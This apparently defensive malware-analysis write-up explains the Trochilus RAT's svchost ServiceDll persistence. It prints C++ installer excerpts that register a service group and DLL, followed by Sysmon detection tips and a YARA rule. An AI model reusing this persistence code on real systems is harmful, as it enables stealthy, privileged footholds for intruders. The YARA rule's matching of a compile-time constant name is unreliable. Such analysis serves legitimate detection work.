# Trochilus RAT - Svchost.exe Shared Service DLL Persistence

**Repository:** Malware-Collection-master  
**File Path:** `Trochilus/client/servant/inst/inst.cpp`  
**Language:** C++  
**MITRE ATT&CK:** T1543.003 - Create or Modify System Process: Windows Service

---

## Overview

The Trochilus RAT, associated with the APT10 group, establishes persistence by registering a malicious DLL to be loaded by a legitimate `svchost.exe` process at startup. This is a powerful and stealthy technique that involves creating a new service configured to run as a shared process (`SERVICE_WIN32_SHARE_PROCESS`). The malware adds its service to a new `svchost` group and specifies its malicious DLL path in the service's `Parameters\ServiceDll` registry key. When the system boots, the Service Control Manager (SCM) starts `svchost.exe`, which in turn loads the malicious DLL, giving the RAT persistent, high-privilege execution while masquerading as a legitimate Windows service.

---

## Code Snippet 1: Registering the Service with a Svchost Group

```cpp
static BOOL InstallSvchostService(LPCTSTR serviceName, LPCTSTR displayName, 
                                  LPCTSTR descripion, LPCTSTR filepath, 
                                  LPCTSTR svchostName)
{
	// ... (OpenSCManager) ...

	HKEY hSvchostKey = NULL;
	// ...
	
	do 
	{
		// STEP 1: Register svchost group in master list
		LONG lRet = ::RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
		    _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\svchost"), 
		    0, KEY_QUERY_VALUE | KEY_WRITE, &hSvchostKey);
		if(ERROR_SUCCESS != lRet)
		{
			break;
		}

		// Add service name to svchost group (multi-string registry value)
		lRet = RegSetValueEx(hSvchostKey, svchostName, 0, REG_MULTI_SZ, 
		                     (const BYTE*)serviceName, 
		                     _tcslen(serviceName) * sizeof(TCHAR));
		if (ERROR_SUCCESS != lRet)
		{
			break;
		}
```

**What it does:**  
This code block modifies the registry to make `svchost.exe` aware of the new service group. It opens the `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\svchost` key and adds a new `REG_MULTI_SZ` value. The name of this value is the name of the new service group (e.g., "XLServant"), and its data contains the name of the malware's service. This tells the OS that services in this group are hosted by `svchost.exe`.

**Why it's T1543.003:**  
This is a preparatory step for creating a `svchost`-hosted service. By registering a new group, the malware integrates itself into the legitimate Windows Service Host infrastructure. This is a key part of masquerading as a legitimate service, a common sub-technique of creating or modifying a system process for persistence.

---

## Code Snippet 2: Creating the Shared Service and Setting the ServiceDll

```cpp
		// STEP 2: Build svchost.exe command line with group parameter
		tstring binpath = _T("%SystemRoot%\\system32\\svchost.exe -k ");
		binpath += svchostName;  // e.g., "%SystemRoot%\system32\svchost.exe -k XLServant"

		// STEP 3: Create the service
		hService = ::CreateService(sch, serviceName, displayName, SERVICE_ALL_ACCESS,
			SERVICE_WIN32_SHARE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, 
			binpath.c_str(), NULL, NULL, NULL, NULL, NULL);
		if(hService == NULL)
		{
			break;
		}

		// STEP 4: Set the ServiceDll parameter in the registry
		tstring servicekey = _T("SYSTEM\\CurrentControlSet\\Services\\");
		servicekey += serviceName;
		lRet = ::RegOpenKeyEx(HKEY_LOCAL_MACHINE, servicekey.c_str(), 0, KEY_WRITE, &hServiceKey);
		if(ERROR_SUCCESS != lRet)
		{
			break;
		}

		lRet = ::RegCreateKeyEx(hServiceKey, _T("Parameters"), 0, NULL, 
		                        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hParametersKey, NULL);
		if(ERROR_SUCCESS != lRet)
		{
			break;
		}

		lRet = ::RegSetValueEx(hParametersKey, _T("ServiceDll"), 0, REG_EXPAND_SZ, 
		                       (const BYTE*)filepath, (_tcslen(filepath)+1)*sizeof(TCHAR));
		if(ERROR_SUCCESS != lRet)
		{
			break;
		}

		bSuccess = TRUE;
	} while (FALSE);

	// ... (cleanup) ...
	return bSuccess;
}
```

**What it does:**  
This code first calls `CreateService` with the `SERVICE_WIN32_SHARE_PROCESS` type and a command line pointing to `svchost.exe -k <group_name>`. This creates the service but doesn't yet specify the malicious DLL. The code then creates a `Parameters` subkey under the service's main registry key (`HKLM\SYSTEM\CurrentControlSet\Services\<service_name>`) and sets the `ServiceDll` value to the path of the malware's DLL.

**Why it's T1543.003:**  
This is the core of the persistence technique. `CreateService` with `SERVICE_AUTO_START` registers the process to run at boot. Using `SERVICE_WIN32_SHARE_PROCESS` and setting the `ServiceDll` registry value are the specific mechanisms that cause the legitimate `svchost.exe` to load and execute the malware's code, achieving persistence by masquerading as a standard Windows shared service.

---

## Detection & Evasion

### Sysmon Telemetry

- **Event ID 13: RegistryEvent (Value Set)**: Monitor for new values being added to the `HKLM\...\svchost` key. Also, monitor for the creation of a `ServiceDll` value under any key in `HKLM\SYSTEM\CurrentControlSet\Services`.
  - **TargetObject:**
    - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\svchost`
    - `HKLM\SYSTEM\CurrentControlSet\Services\*\Parameters\ServiceDll`
- **Event ID 1: ProcessCreate**: Look for `svchost.exe` being launched with a new or unrecognized `-k` group parameter.
  - **CommandLine:** `svchost.exe -k <new_group_name>`
- **Event ID 7: ImageLoad**: A `svchost.exe` process will load the malicious DLL. Monitor for `svchost.exe` loading unsigned DLLs or DLLs from unusual file paths.

### YARA Rule

```yara
rule T1543_Persistence_Trochilus_SvchostDLL
{
    meta:
        author = "Vengful"
        description = "Detects strings related to Trochilus RAT's svchost.exe DLL hosting persistence."
        reference = "Internal Research"
        date = "2025-11-25"
        mitre_attack = "T1543.003"

    strings:
        // Key registry paths and values
        $s1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\svchost" wide
        $s2 = "system32\\svchost.exe -k " wide
        $s3 = "ServiceDll" wide
        $s4 = "Parameters" wide

        // Service type flag
        $s5 = "SERVICE_WIN32_SHARE_PROCESS"

    condition:
        uint16(0) == 0x5A4D and // MZ header
        all of them
}
```
